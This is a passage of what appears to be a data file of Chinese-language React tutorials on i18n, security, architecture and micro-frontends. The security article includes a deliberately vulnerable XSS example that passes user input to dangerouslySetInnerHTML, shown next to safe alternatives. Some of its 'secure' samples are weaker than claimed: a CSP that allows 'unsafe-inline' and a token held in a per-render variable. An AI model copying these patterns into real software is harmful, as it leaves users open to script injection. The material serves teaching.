    backend: {
      loadPath: '/locales/{{lng}}/{{ns}}.json',
    },
    // 只加载需要的命名空间
    partialBundledLanguages: true,
    // 预加载常用语言
    preload: ['en'],
  });

// 动态加载命名空间
function AdminPanel() {
  const { t } = useTranslation('admin', { useSuspense: true });
  return <div>{t('title')}</div>;
}

// 使用 Suspense 处理加载状态
function App() {
  return (
    <Suspense fallback={<Loading />}>
      <AdminPanel />
    </Suspense>
  );
}
\`\`\`

**缓存翻译文件：**
- 使用 Service Worker 缓存翻译文件
- 利用浏览器 HTTP 缓存
- 使用 localStorage 缓存已加载的翻译

\`\`\`typescript
// 使用 localStorage 缓存
const localStorageBackend = {
  type: 'localStorage',
  prefix: 'i18next_',
  expirationTime: 7 * 24 * 60 * 60 * 1000, // 7天
};

i18n.use(initReactI18next).init({
  backend: {
    backends: [
      localStorageBackend, // 优先从缓存读取
      HttpBackend, // 缓存未命中时从服务器加载
    ],
  },
});
\`\`\`

**优化渲染性能：**
- 避免不必要的重新渲染，使用 memo 包裹组件
- 使用 useMemo 缓存翻译结果
- 避免在渲染中动态生成翻译 key

\`\`\`typescript
// 优化前：每次渲染都创建新对象
function UserCard({ user }) {
  const { t } = useTranslation();
  return (
    <div>
      <h2>{t('user.greeting', { name: user.name })}</h2>
      <p>{t('user.role', { role: user.role })}</p>
    </div>
  );
}

// 优化后：使用 memo 和 useMemo
const UserCard = memo(function UserCard({ user }) {
  const { t } = useTranslation();
  const values = useMemo(() => ({ name: user.name }), [user.name]);
  return (
    <div>
      <h2>{t('user.greeting', values)}</h2>
      <p>{t('user.role', { role: user.role })}</p>
    </div>
  );
});
\`\`\`

### 最佳实践

**组件化翻译：**
- 创建国际化组件封装翻译逻辑
- 提高代码复用性，统一翻译风格
- 便于后期维护和修改

\`\`\`typescript
// 封装翻译组件
interface TranslatedTextProps {
  id: string;
  values?: Record<string, string | number>;
  defaultValue?: string;
}

const TranslatedText: React.FC<TranslatedTextProps> = ({ 
  id, 
  values, 
  defaultValue 
}) => {
  const { t } = useTranslation();
  return <>{t(id, values, { defaultValue })}</>;
};

// 使用示例
<TranslatedText id="welcome.message" values={{ name: 'Alice' }} />
\`\`\`

**占位符和插值：**
- 使用占位符处理动态内容，避免字符串拼接
- 支持复数形式，不同语言复数规则不同
- 支持性别变化，某些语言需要根据性别调整

\`\`\`typescript
// 插值示例
// en.json
{
  "greeting": "Hello, {{name}}!",
  "items": "{{count}} item",
  "items_plural": "{{count}} items"
}

// zh.json
{
  "greeting": "你好，{{name}}！",
  "items": "{{count}} 个项目"
}

// 使用
t('greeting', { name: 'Alice' }) // "Hello, Alice!" / "你好，Alice！"
t('items', { count: 1 }) // "1 item" / "1 个项目"
t('items', { count: 5 }) // "5 items" / "5 个项目"
\`\`\`

**日期和时间本地化：**
- 使用本地化的日期和时间格式
- 考虑时区问题，显示用户本地时间
- 使用 Intl.DateTimeFormat 或库处理

\`\`\`typescript
// 使用 Intl API 格式化日期
const formatDate = (date: Date, locale: string) => {
  return new Intl.DateTimeFormat(locale, {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    weekday: 'long',
  }).format(date);
};

// en: "Saturday, March 15, 2026"
// zh: "2026年3月15日星期六"

// 使用 react-intl
import { FormattedDate, FormattedRelativeTime } from 'react-intl';

<FormattedDate 
  value={new Date()} 
  year="numeric" 
  month="long" 
  day="numeric" 
/>

<FormattedRelativeTime 
  value={-5} 
  unit="minute" 
  numeric="auto" 
/>
// "5 minutes ago" / "5分钟前"
\`\`\`

**数字和货币本地化：**
- 使用本地化的数字格式
- 正确处理货币符号和位置
- 使用 Intl.NumberFormat 或库处理

\`\`\`typescript
// 使用 Intl API 格式化数字
const formatNumber = (number: number, locale: string) => {
  return new Intl.NumberFormat(locale).format(number);
};

// en: "1,234,567.89"
// zh: "1,234,567.89"
// de: "1.234.567,89"

// 格式化货币
const formatCurrency = (amount: number, locale: string, currency: string) => {
  return new Intl.NumberFormat(locale, {
    style: 'currency',
    currency: currency,
  }).format(amount);
};

// en-US, USD: "$1,234.56"
// zh-CN, CNY: "\xa51,234.56"
// ja-JP, JPY: "￥1,235"
\`\`\`

**RTL（从右到左）布局支持：**
- 测试 RTL 布局，如阿拉伯语、希伯来语
- 使用 CSS 逻辑属性（start/end 代替 left/right）
- 提供布局方向切换功能

\`\`\`typescript
// RTL 支持
function App() {
  const { i18n } = useTranslation();
  const isRTL = ['ar', 'he', 'fa'].includes(i18n.language);
  
  return (
    <div dir={isRTL ? 'rtl' : 'ltr'} className={isRTL ? 'rtl' : 'ltr'}>
      {/* 内容 */}
    </div>
  );
}

// CSS 逻辑属性
.card {
  padding-inline-start: 16px; /* LTR: padding-left, RTL: padding-right */
  margin-inline-end: 8px;
  border-start-start-radius: 8px; /* LTR: top-left, RTL: top-right */
}
\`\`\`

**测试国际化：**
- 测试不同语言的渲染效果
- 测试文本长度变化对布局的影响
- 测试 RTL 布局
- 测试日期、数字、货币格式化

\`\`\`typescript
// 国际化测试示例
import { render, screen } from '@testing-library/react';
import { I18nextProvider } from 'react-i18next';
import i18n from './i18n';

describe('Navigation', () => {
  it('renders in English', () => {
    i18n.changeLanguage('en');
    render(
      <I18nextProvider i18n={i18n}>
        <Navigation />
      </I18nextProvider>
    );
    expect(screen.getByText('Home')).toBeInTheDocument();
  });

  it('renders in Chinese', () => {
    i18n.changeLanguage('zh');
    render(
      <I18nextProvider i18n={i18n}>
        <Navigation />
      </I18nextProvider>
    );
    expect(screen.getByText('首页')).toBeInTheDocument();
  });
});
\`\`\``,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-security",title:"React 应用安全最佳实践",category:"react",difficulty:"medium",tags:["React","安全","XSS","CSRF"],content:`## React 应用安全最佳实践

安全是 React 应用开发的重要考虑因素，前端安全不仅关乎用户数据保护，也直接影响应用的可靠性和用户信任。React 在设计上已经考虑了许多安全问题，但开发者仍需了解常见的安全威胁和防护措施，构建安全可靠的应用。

### XSS 防护详解

**跨站脚本攻击 (XSS) 原理：**
XSS 攻击是指攻击者将恶意脚本注入到网页中，当其他用户浏览该网页时，恶意脚本会在用户浏览器中执行。XSS 攻击可以窃取用户的 Cookie、Session Token、敏感数据，甚至可以重定向用户到恶意网站、执行未授权操作。XSS 攻击分为反射型（恶意脚本来自 URL 参数）、存储型（恶意脚本存储在服务器数据库）、DOM 型（恶意脚本通过 DOM 操作注入）三种类型。

**React 内置防护机制：**
React 默认会对渲染内容进行转义，将特殊字符转换为 HTML 实体，防止脚本注入。例如，<script> 会被转义为 &lt;script&gt;，从而阻止脚本执行。这是 React 提供的第一道防线，但开发者需要避免绕过这个机制。

**dangerouslySetInnerHTML 的风险：**
dangerouslySetInnerHTML 是 React 提供的用于插入原始 HTML 的 API，它会绕过 React 的转义机制。如果插入的 HTML 包含用户输入，就可能导致 XSS 攻击。使用 dangerouslySetInnerHTML 时必须确保内容来源可信，或使用 DOMPurify 等库进行清理。

### 代码示例

\`\`\`javascript
// ❌ XSS 漏洞示例
function UnsafeComponent({ userInput }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: userInput }} />
  );
}

// ✅ 安全的 HTML 渲染
import DOMPurify from 'dompurify';

function SafeComponent({ userInput }) {
  const sanitizedHTML = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'title']
  });
  
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />
  );
}

// ✅ React 默认转义（安全）
function SafeDefault({ userInput }) {
  // React 会自动转义 userInput
  return <div>{userInput}</div>;
}

// URL 安全处理
function SafeLink({ url, children }) {
  // 验证 URL 协议
  const isSafeURL = (url) => {
    try {
      const parsedURL = new URL(url, window.location.origin);
      return ['http:', 'https:', 'mailto:'].includes(parsedURL.protocol);
    } catch {
      return false;
    }
  };
  
  const safeURL = isSafeURL(url) ? url : '#';
  
  return (
    <a 
      href={safeURL} 
      target="_blank" 
      rel="noopener noreferrer"
    >
      {children}
    </a>
  );
}

// CSP 配置示例（在 HTML 中）
// <meta http-equiv="Content-Security-Policy" 
//       content="default-src 'self'; 
//                script-src 'self' 'unsafe-inline' https://trusted.cdn.com; 
//                style-src 'self' 'unsafe-inline'; 
//                img-src 'self' data: https:; 
//                connect-src 'self' https://api.example.com;">

// CSRF 防护示例
function SecureForm() {
  const [formData, setFormData] = useState({});
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // 获取 CSRF Token
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
    
    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken
        },
        credentials: 'include', // 发送 Cookie
        body: JSON.stringify(formData)
      });
      
      if (!response.ok) throw new Error('Submit failed');
      
      const result = await response.json();
      console.log('Success:', result);
    } catch (error) {
      console.error('Error:', error);
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input 
        type="text" 
        onChange={(e) => setFormData({ ...formData, name: e.target.value })}
      />
      <button type="submit">Submit</button>
    </form>
  );
}

// 敏感数据处理
function SecureAuth() {
  // ❌ 不安全：存储敏感数据
  // localStorage.setItem('token', sensitiveToken);
  
  // ✅ 安全：使用 HttpOnly Cookie（服务器设置）
  // 服务器端设置：Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
  
  // ✅ 安全：使用内存存储（页面刷新后需要重新获取）
  let token = null;
  
  const login = async (credentials) => {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials),
      credentials: 'include'
    });
    
    if (response.ok) {
      const data = await response.json();
      token = data.token; // 存储在内存中
    }
  };
  
  const logout = () => {
    token = null; // 清除内存中的 token
    fetch('/api/logout', { method: 'POST', credentials: 'include' });
  };
  
  return <LoginForm onLogin={login} onLogout={logout} />;
}

// 环境变量安全使用
// ❌ 不安全：暴露敏感信息
// const API_KEY = process.env.REACT_APP_SECRET_KEY; // 会被打包到客户端代码

// ✅ 安全：敏感操作在服务器端进行
// 客户端调用服务器 API，服务器使用密钥
async function fetchData() {
  const response = await fetch('/api/data', {
    headers: {
      'Authorization': \`Bearer \${getToken()}\`
    }
  });
  return response.json();
}

// 依赖安全检查脚本
// package.json
// {
//   "scripts": {
//     "audit": "npm audit",
//     "audit:fix": "npm audit fix"
//   }
// }

// 输入验证和清理
function validateInput(input, type) {
  const validators = {
    email: (value) => /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(value),
    phone: (value) => /^1[3-9]\\d{9}$/.test(value),
    username: (value) => /^[a-zA-Z0-9_]{3,20}$/.test(value),
    url: (value) => {
      try {
        new URL(value);
        return true;
      } catch {
        return false;
      }
    }
  };
  
  const sanitizer = {
    text: (value) => DOMPurify.sanitize(value),
    number: (value) => parseInt(value, 10) || 0,
    alphanumeric: (value) => value.replace(/[^a-zA-Z0-9]/g, '')
  };
  
  return {
    isValid: validators[type]?.(input) ?? true,
    sanitized: sanitizer[type]?.(input) ?? input
  };
}

// 安全的错误处理
function SecureErrorBoundary({ children }) {
  const [hasError, setHasError] = useState(false);
  
  useEffect(() => {
    const handleError = (event) => {
      // 记录错误到服务器，但不暴露敏感信息
      logError({
        message: event.message,
        stack: event.error?.stack,
        timestamp: new Date().toISOString()
      });
      
      setHasError(true);
      event.preventDefault();
    };
    
    window.addEventListener('error', handleError);
    window.addEventListener('unhandledrejection', handleError);
    
    return () => {
      window.removeEventListener('error', handleError);
      window.removeEventListener('unhandledrejection', handleError);
    };
  }, []);
  
  if (hasError) {
    return <div>Something went wrong. Please try again.</div>;
  }
  
  return children;
}
\`\`\`

### CSRF 防护详解

**跨站请求伪造 (CSRF) 原理：**
CSRF 攻击利用用户已认证的身份，诱导用户在不知情的情况下向目标网站发送恶意请求。攻击者可以伪造转账、修改密码、删除数据等操作。CSRF 攻击成功的关键是浏览器会自动携带目标网站的 Cookie。

**CSRF 防护策略：**
使用 CSRF Token 是最常用的防护方法，服务器生成随机 Token，嵌入到表单或请求头中，服务器验证 Token 有效性。验证 Origin 和 Referer 头可以检测跨站请求。使用 SameSite Cookie 属性可以限制 Cookie 在跨站请求中的发送。实现正确的 CORS 策略可以控制跨域请求的访问权限。

### 其他安全最佳实践

**敏感数据保护：**
不在前端存储敏感数据，如密码、API 密钥、私钥等。使用 HttpOnly、Secure、SameSite 属性的 Cookie 存储认证信息。使用 HTTPS 加密传输数据，防止中间人攻击。对敏感数据进行加密存储，使用 Web Crypto API 进行客户端加密。

**依赖安全管理：**
定期运行 npm audit 检查依赖漏洞，及时更新有漏洞的依赖包。配置 dependabot 或 Renovate 自动更新依赖。使用 Snyk 等工具进行持续的安全监控。锁定依赖版本，使用 package-lock.json 或 yarn.lock 确保依赖一致性。

**安全开发流程：**
建立安全代码审查机制，使用静态代码分析工具（如 ESLint 安全插件）检测潜在问题。进行渗透测试和安全扫描，模拟攻击场景验证防护措施。培训开发团队的安全意识，建立安全漏洞响应机制。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-architecture",title:"React 应用架构设计最佳实践",category:"react",difficulty:"hard",tags:["React","架构","设计模式"," scalability"],content:`## React 应用架构设计最佳实践

良好的架构是 React 应用可维护性和可扩展性的关键。一个优秀的 React 应用架构应该遵循关注点分离、单一职责、高内聚低耦合等原则，同时考虑团队协作、代码可维护性和长期演进能力。

### 文件夹结构

**按功能组织（Feature-based）：**
- 按业务功能划分文件夹，每个功能模块独立管理
- 每个功能包含相关的组件、hooks、utils、types、styles
- 提高代码的内聚性，便于功能开发和维护
- 适合中大型应用，支持团队并行开发

\`\`\`
src/
├── features/
│   ├── auth/
│   │   ├── components/
│   │   │   ├── LoginForm.tsx
│   │   │   └── RegisterForm.tsx
│   │   ├── hooks/
│   │   │   └── useAuth.ts
│   │   ├── api/
│   │   │   └── authApi.ts
│   │   ├── types/
│   │   │   └── auth.types.ts
│   │   └── index.ts
│   ├── dashboard/
│   └── profile/
├── shared/
│   ├── components/
│   ├── hooks/
│   └── utils/
└── App.tsx
\`\`\`

**按类型组织（Type-based）：**
- 按组件、hooks、utils 等类型划分
- 适合小型应用和快速原型开发
- 易于找到特定类型的文件
- 缺点是功能模块分散，不利于维护

\`\`\`
src/
├── components/
│   ├── Button.tsx
│   ├── Modal.tsx
│   └── Header.tsx
├── hooks/
│   ├── useAuth.ts
│   └── useApi.ts
├── utils/
│   └── helpers.ts
└── App.tsx
\`\`\`

**混合组织（Hybrid）：**
- 结合功能和类型组织，取两者之长
- 核心业务功能按功能组织，提高内聚性
- 通用功能按类型组织，便于复用
- 是大多数中大型项目的最佳选择

### 组件设计

**组件拆分原则：**
- 遵循单一职责原则，每个组件只做一件事
- 拆分为原子组件（Atoms）、分子组件（Molecules）、组织组件（Organisms）、模板组件（Templates）、页面组件（Pages）
- 原子组件是最基础的UI元素，如Button、Input、Icon
- 分子组件由原子组件组合而成，如SearchForm、Card
- 组织组件是复杂的UI区块，如Header、Sidebar
- 合理使用组合而非继承，React推荐组合模式

\`\`\`typescript
// 原子组件：Button
interface ButtonProps {
  variant?: 'primary' | 'secondary' | 'danger';
  size?: 'sm' | 'md' | 'lg';
  children: React.ReactNode;
  onClick?: () => void;
}

const Button: React.FC<ButtonProps> = ({ 
  variant = 'primary', 
  size = 'md', 
  children, 
  onClick 
}) => {
  return (
    <button 
      className={\`btn btn-\${variant} btn-\${size}\`}
      onClick={onClick}
    >
      {children}
    </button>
  );
};

// 分子组件：SearchForm
const SearchForm: React.FC<{ onSearch: (query: string) => void }> = ({ onSearch }) => {
  const [query, setQuery] = useState('');
  
  return (
    <form onSubmit={(e) => { e.preventDefault(); onSearch(query); }}>
      <Input 
        value={query} 
        onChange={(e) => setQuery(e.target.value)} 
        placeholder="Search..."
      />
      <Button type="submit">Search</Button>
    </form>
  );
};

// 组织组件：Header
const Header: React.FC = () => {
  return (
    <header className="header">
      <Logo />
      <Navigation />
      <SearchForm onSearch={handleSearch} />
      <UserMenu />
    </header>
  );
};
\`\`\`

**组件通信策略：**
- 父子组件：props 和回调函数，这是最基本也是最推荐的通信方式
- 跨组件：Context API 或状态管理库，避免props drilling问题
- 全局通信：事件总线或全局状态管理，谨慎使用避免过度复杂化

\`\`\`typescript
// 父子组件通信
interface ChildProps {
  data: string;
  onUpdate: (newValue: string) => void;
}

const Child: React.FC<ChildProps> = ({ data, onUpdate }) => {
  return (
    <div>
      <span>{data}</span>
      <button onClick={() => onUpdate('new value')}>Update</button>
    </div>
  );
};

const Parent: React.FC = () => {
  const [value, setValue] = useState('initial');
  return <Child data={value} onUpdate={setValue} />;
};

// Context 跨组件通信
const ThemeContext = createContext<{ theme: string; setTheme: (t: string) => void }>({
  theme: 'light',
  setTheme: () => {},
});

const ThemedButton: React.FC = () => {
  const { theme, setTheme } = useContext(ThemeContext);
  return (
    <button 
      className={\`btn btn-\${theme}\`}
      onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}
    >
      Toggle Theme
    </button>
  );
};
\`\`\`

**组件复用模式：**
- 创建可复用的 UI 组件库，统一设计语言
- 使用 props 控制组件行为，提供灵活的配置能力
- 提供合理的默认值，降低使用门槛
- 使用 render props 和 HOC 模式实现高级复用

\`\`\`typescript
// Render Props 模式
interface DataFetcherProps {
  url: string;
  children: (data: any, loading: boolean, error: Error | null) => React.ReactNode;
}

const DataFetcher: React.FC<DataFetcherProps> = ({ url, children }) => {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<Error | null>(null);

  useEffect(() => {
    fetch(url)
      .then(res => res.json())
      .then(setData)
      .catch(setError)
      .finally(() => setLoading(false));
  }, [url]);

  return <>{children(data, loading, error)}</>;
};

// 使用示例
<DataFetcher url="/api/users">
  {(users, loading, error) => {
    if (loading) return <Spinner />;
    if (error) return <Error message={error.message} />;
    return <UserList users={users} />;
  }}
</DataFetcher>

// HOC 模式
function withLoading<P>(WrappedComponent: React.ComponentType<P>) {
  return function WithLoadingComponent({ isLoading, ...props }: P & { isLoading: boolean }) {
    if (isLoading) return <Spinner />;
    return <WrappedComponent {...(props as P)} />;
  };
}
\`\`\`

### 状态管理

**状态分层策略：**
- 组件内部状态（Local State）：使用 useState 管理，适用于组件私有的UI状态
- 跨组件状态（Shared State）：使用 Context API，适用于简单的跨组件共享
- 全局状态（Global State）：使用 Redux Toolkit、Zustand 等状态管理库
- 服务器状态（Server State）：使用 React Query 或 SWR，自动处理缓存和同步

\`\`\`typescript
// 组件内部状态
const Counter: React.FC = () => {
  const [count, setCount] = useState(0);
  return (
    <div>
      <span>{count}</span>
      <button onClick={() => setCount(c => c + 1)}>+1</button>
    </div>
  );
};

// Context 跨组件状态
interface User {
  id: string;
  name: string;
  email: string;
}

interface UserContextType {
  user: User | null;
  login: (user: User) => void;
  logout: () => void;
}

const UserContext = createContext<UserContextType | null>(null);

export const UserProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(null);
  
  const login = (user: User) => setUser(user);
  const logout = () => setUser(null);
  
  return (
    <UserContext.Provider value={{ user, login, logout }}>
      {children}
    </UserContext.Provider>
  );
};

export const useUser = () => {
  const context = useContext(UserContext);
  if (!context) throw new Error('useUser must be used within UserProvider');
  return context;
};

// Zustand 全局状态
import { create } from 'zustand';

interface AppState {
  count: number;
  increment: () => void;
  decrement: () => void;
}

const useStore = create<AppState>((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 })),
  decrement: () => set((state) => ({ count: state.count - 1 })),
}));

// React Query 服务器状态
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

const fetchUsers = async (): Promise<User[]> => {
  const res = await fetch('/api/users');
  return res.json();
};

const UserList: React.FC = () => {
  const { data, isLoading, error } = useQuery({
    queryKey: ['users'],
    queryFn: fetchUsers,
  });

  if (isLoading) return <Spinner />;
  if (error) return <Error />;
  return <ul>{data?.map(user => <li key={user.id}>{user.name}</li>)}</ul>;
};
\`\`\`

**状态设计原则：**
- 保持状态最小化，避免冗余和派生状态
- 状态就近原则，能放在局部就不放在全局
- 避免状态冗余，使用 useMemo 计算派生状态
- 状态更新逻辑清晰，使用不可变数据

\`\`\`typescript
// ❌ 错误：冗余状态
const [firstName, setFirstName] = useState('');
const [lastName, setLastName] = useState('');
const [fullName, setFullName] = useState(''); // 冗余！

// ✅ 正确：最小化状态 + 派生值
const [firstName, setFirstName] = useState('');
const [lastName, setLastName] = useState('');
const fullName = \`\${firstName} \${lastName}\`; // 派生值

// ✅ 使用 useMemo 优化派生状态
const expensiveValue = useMemo(() => {
  return heavyCalculation(rawData);
}, [rawData]);
\`\`\`

### 数据流

**单向数据流原则：**
- 数据从父组件流向子组件，形成清晰的数据流向
- 状态更新通过回调函数向上传递，保持数据流可预测
- 避免双向绑定带来的复杂性，调试更加容易

\`\`\`typescript
// 单向数据流示例
interface TodoListProps {
  todos: Todo[];
  onToggle: (id: string) => void;
  onDelete: (id: string) => void;
}

const TodoList: React.FC<TodoListProps> = ({ todos, onToggle, onDelete }) => {
  return (
    <ul>
      {todos.map(todo => (
        <TodoItem 
          key={todo.id}
          todo={todo}
          onToggle={onToggle}
          onDelete={onDelete}
        />
      ))}
    </ul>
  );
};

// 父组件管理状态，子组件通过回调通知变化
const TodoApp: React.FC = () => {
  const [todos, setTodos] = useState<Todo[]>([]);
  
  const handleToggle = (id: string) => {
    setTodos(todos.map(t => 
      t.id === id ? { ...t, completed: !t.completed } : t
    ));
  };
  
  return <TodoList todos={todos} onToggle={handleToggle} />;
};
\`\`\`

**数据获取策略：**
- 使用 React Query 或 SWR 管理异步数据，自动处理缓存、重试、失效
- 处理加载和错误状态，提供良好的用户体验
- 支持缓存和失效策略，减少不必要的网络请求

\`\`\`typescript
// React Query 数据获取
const useUserPosts = (userId: string) => {
  return useQuery({
    queryKey: ['posts', userId],
    queryFn: () => fetchUserPosts(userId),
    staleTime: 5 * 60 * 1000, // 5分钟内数据视为新鲜
    gcTime: 10 * 60 * 1000, // 10分钟后清除缓存
    refetchOnWindowFocus: true, // 窗口聚焦时重新获取
  });
};

// 乐观更新
const useUpdatePost = () => {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: updatePost,
    onMutate: async (newPost) => {
      // 取消正在进行的查询
      await queryClient.cancelQueries({ queryKey: ['posts'] });
      
      // 保存旧数据
      const previousPosts = queryClient.getQueryData(['posts']);
      
      // 乐观更新
      queryClient.setQueryData(['posts'], (old: Post[]) => 
        old.map(p => p.id === newPost.id ? newPost : p)
      );
      
      return { previousPosts };
    },
    onError: (err, newPost, context) => {
      // 回滚
      queryClient.setQueryData(['posts'], context.previousPosts);
    },
    onSettled: () => {
      queryClient.invalidateQueries({ queryKey: ['posts'] });
    },
  });
};
\`\`\`

### 最佳实践

**代码规范与质量：**
- 使用 ESLint 和 Prettier 保持代码风格一致
- 遵循一致的命名规范：组件用 PascalCase，hooks 用 use 前缀
- 编写清晰的注释和文档，使用 JSDoc 标注复杂逻辑
- 使用 TypeScript 增强类型安全

\`\`\`typescript
// ESLint 配置示例
// .eslintrc.js
module.exports = {
  extends: [
    'eslint:recommended',
    'plugin:react/recommended',
    'plugin:react-hooks/recommended',
    'plugin:@typescript-eslint/recommended',
    'prettier',
  ],
  rules: {
    'react/react-in-jsx-scope': 'off',
    'react-hooks/rules-of-hooks': 'error',
    'react-hooks/exhaustive-deps': 'warn',
    '@typescript-eslint/no-unused-vars': ['error', { argsIgnorePattern: '^_' }],
  },
};

// Prettier 配置示例
// .prettierrc
{
  "semi": true,
  "singleQuote": true,
  "tabWidth": 2,
  "trailingComma": "es5",
  "printWidth": 100
}
\`\`\`

**文档与知识共享：**
- 组件 API 文档：使用 Storybook 展示组件用法
- 架构设计文档：记录技术决策和设计思路
- 开发指南：包含编码规范、Git 工作流、发布流程

\`\`\`typescript
// 组件文档示例
/**
 * Button 组件 - 基础按钮组件
 * 
 * @example
 * // 基础用法
 * <Button onClick={handleClick}>Click me</Button>
 * 
 * // 不同变体
 * <Button variant="primary">Primary</Button>
 * <Button variant="secondary">Secondary</Button>
 * <Button variant="danger">Danger</Button>
 * 
 * // 不同尺寸
 * <Button size="sm">Small</Button>
 * <Button size="md">Medium</Button>
 * <Button size="lg">Large</Button>
 */
interface ButtonProps {
  /** 按钮变体样式 */
  variant?: 'primary' | 'secondary' | 'danger';
  /** 按钮尺寸 */
  size?: 'sm' | 'md' | 'lg';
  /** 点击事件处理 */
  onClick?: () => void;
  /** 子元素 */
  children: React.ReactNode;
}
\`\`\`

**测试策略：**
- 单元测试：测试独立组件和工具函数
- 集成测试：测试组件交互和数据流
- 端到端测试：测试完整用户流程

\`\`\`typescript
// 组件单元测试示例
import { render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { LoginForm } from './LoginForm';

describe('LoginForm', () => {
  it('renders email and password inputs', () => {
    render(<LoginForm onSubmit={jest.fn()} />);
    expect(screen.getByLabelText(/email/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/password/i)).toBeInTheDocument();
  });

  it('calls onSubmit with form data', async () => {
    const handleSubmit = jest.fn();
    render(<LoginForm onSubmit={handleSubmit} />);
    
    await userEvent.type(screen.getByLabelText(/email/i), 'test@example.com');
    await userEvent.type(screen.getByLabelText(/password/i), 'password123');
    await userEvent.click(screen.getByRole('button', { name: /submit/i }));
    
    expect(handleSubmit).toHaveBeenCalledWith({
      email: 'test@example.com',
      password: 'password123',
    });
  });

  it('shows validation error for invalid email', async () => {
    render(<LoginForm onSubmit={jest.fn()} />);
    
    await userEvent.type(screen.getByLabelText(/email/i), 'invalid-email');
    await userEvent.click(screen.getByRole('button', { name: /submit/i }));
    
    expect(screen.getByText(/invalid email/i)).toBeInTheDocument();
  });
});
\`\`\`

**部署与运维：**
- CI/CD 流程：自动化构建、测试、部署
- 环境配置管理：使用环境变量管理不同环境配置
- 监控和日志：集成错误追踪和性能监控

\`\`\`yaml
# GitHub Actions CI/CD 示例
name: CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Lint
        run: npm run lint
      
      - name: Type check
        run: npm run typecheck
      
      - name: Test
        run: npm run test:coverage
      
      - name: Build
        run: npm run build
      
      - name: Deploy to Vercel
        if: github.ref == 'refs/heads/main'
        run: npx vercel --prod --token=\${{ secrets.VERCEL_TOKEN }}
\`\`\``,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-microfrontends",title:"React 微前端架构实践",category:"react",difficulty:"hard",tags:["React","微前端","Module Federation","架构"],content:`## React 微前端架构实践

微前端是将大型前端应用拆分为多个独立部署的小型应用的架构模式。

### 微前端核心概念

**什么是微前端：**
- 将大型应用拆分为多个小型应用
- 每个微应用独立开发、部署、维护
- 集成到同一个容器应用中

**优势：**
- 团队独立开发，加快迭代速度
- 技术栈独立选择
- 故障隔离，提高可靠性
- 按需加载，提高性能

**挑战：**
- 集成复杂性
- 样式隔离
- 状态管理
- 路由协调

### 实现方案

**Module Federation：**
- Webpack 5 提供的功能：Webpack 5提供了持久化缓存、模块联邦（Module Federation）、改进的Tree Shaking等新特性，模块联邦允许在不同构建之间共享代码，是微前端架构的重要基础，持久化缓存可以显著加快构建速度，是现代React项目构建工具的主流选择
- 动态加载远程模块
- 支持运行时共享依赖

**Single-SPA：**
- 微前端框架
- 支持多种框架
- 路由管理和应用生命周期

**qiankun：**
- 基于 Single-SPA 的微前端框架
- 提供更完善的功能
- 支持 React、Vue、Angular 等

### 实践要点

**应用拆分：**
- 按业务域拆分
- 合理定义微应用边界
- 避免过度拆分

**通信机制：**
- 基于事件的通信
- 共享状态管理
-  props 传递

**样式隔离：**
- CSS Modules：CSS Modules是CSS模块化解决方案，通过将CSS类名转换为唯一的哈希值来实现作用域隔离，避免样式冲突，支持组合、变量等特性，可以在React组件中直接导入使用，是React项目中常用的CSS组织方式，配合webpack的css-loader或Vite的CSS模块支持使用
- Shadow DOM：Shadow DOM是Web Components的核心特性，提供了完全的样式隔离，React可以通过React Shadow DOM库使用Shadow DOM，Shadow DOM内部的样式不会影响外部，外部样式也不会影响内部，适合创建可复用的组件，特别是需要严格样式隔离的组件，如第三方组件库
- CSS-in-JS：CSS-in-JS是将CSS样式写在JavaScript中的解决方案，主流库包括styled-components和emotion，优点是可以在JS中使用CSS特性如嵌套、变量、混合宏等，组件样式与组件代码共存便于维护，缺点是运行时开销和可能的包体积增加，适合需要动态样式或组件化样式管理的项目

**依赖共享：**
- 共享基础依赖
- 避免依赖冲突
- 版本管理策略

### 最佳实践

**容器应用：**
- 负责路由管理
- 提供共享服务
- 处理应用加载和卸载

**微应用：**
- 独立开发和部署
- 定义清晰的接口
- 处理自己的状态和逻辑

**CI/CD：**
- 独立的构建和部署流程
- 自动化测试
- 集成测试

**监控和日志：**
- 统一的监控系统
- 分布式日志
- 性能监控`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-meta-frameworks",title:"React 元框架对比与选择",category:"react",difficulty:"medium",tags:["React","Next.js","Remix","元框架"],content:`## React 元框架对比与选择

元框架为 React 应用提供了更完整的开发体验，包括路由、SSR、构建等功能。

### 主流元框架

**Next.js：**
- Vercel 开发的 React 元框架：Next.js是Vercel开发的React元框架，提供了服务端渲染（SSR）、静态站点生成（SSG）、增量静态再生成（ISR）等高级渲染模式，内置文件系统路由、API路由、图像优化等功能，是React全栈开发的标配，Vercel提供一键部署支持
- 支持 SSG、SSR、ISR
- 内置路由、API 路由
